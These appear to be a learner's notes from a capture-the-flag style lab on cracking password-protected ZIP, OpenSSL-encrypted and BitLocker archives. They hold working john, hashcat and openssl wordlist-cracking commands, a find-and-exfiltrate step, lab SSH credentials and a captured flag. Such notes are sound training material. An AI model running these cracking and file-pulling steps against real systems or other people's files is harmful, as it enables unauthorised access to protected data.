# Protected Archives

Archive : split all the necessary files in a structured way according to the projects (often in subfolders), summarize them, and pack them into a single file.

Examples of zip : tar , gz , kdbx , 7z

## Download All File Extensions

curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt

Not all of the above archives support password protection : For example, with tar, the tool openssl or gpg is used to encrypt the archives.

## Cracking Archives

### Cracking ZIP

for ext in $(echo ".zip");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
zip2john ZIP.zip > zip.hash
cat zip.hash
john --wordlist=rockyou.txt zip.hash
john zip.hash --show

### Cracking OpenSSL Encrypted Archives

ls

GZIP.gzip  rockyou.txt


file GZIP.gzip

GZIP.gzip: openssl enc'd data with salted password

for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now

<SNIP>

ls

customers.csv  GZIP.gzip  rockyou.txt

### Cracking BitLocker Encrypted Drives

bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
cat backup.hash
hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
cat backup.cracked 

-> The easiest way to mount a BitLocker encrypted virtual drive is to transfer it to a Windows system and mount it.

## LAB

ssh kira@$TARGET
L0vey0u1!

kira@nix01:~$ for ext in $(echo ".zip");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .zip
/home/kira/Documents/Notes.zip

On target :
cd /home/kira/Documents/
python3 -m http.server

On pwnbox :
wget $TARGET:8000/Notes.zip

zip2john Notes.zip > zip.hash
cat zip.hash

Notes.zip/notes.txt:$pkzip2$1*2*2*0*26*1a*d0ced23b*0*43*0*26*d0ce*7ef8*b154046595e5f738ad20bd1cda08958a8814bd6c6153218183c0496d728da36461c0c7b77e1c*$/pkzip2$:notes.txt:Notes.zip::Notes.zip


john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
john zip.hash --show

john --wordlist=/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt zip.hash

john --wordlist=password.list zip.hash

git clone https://github.com/danielmiessler/SecLists.git

tar -xf SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

john --wordlist=rockyou.txt zip.hash

hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

john --wordlist=mut_password.list zip.hash
john zip.hash --show

Notes.zip/notes.txt:P@ssw0rd3!:notes.txt:Notes.zip::Notes.zip

1 password hash cracked, 0 left

unzip Notes.zip 
Archive:  Notes.zip
[Notes.zip] notes.txt password: 
 extracting: notes.txt

cat notes.txt 
HTB{ocnc7r4io8ucsj8eujcm}
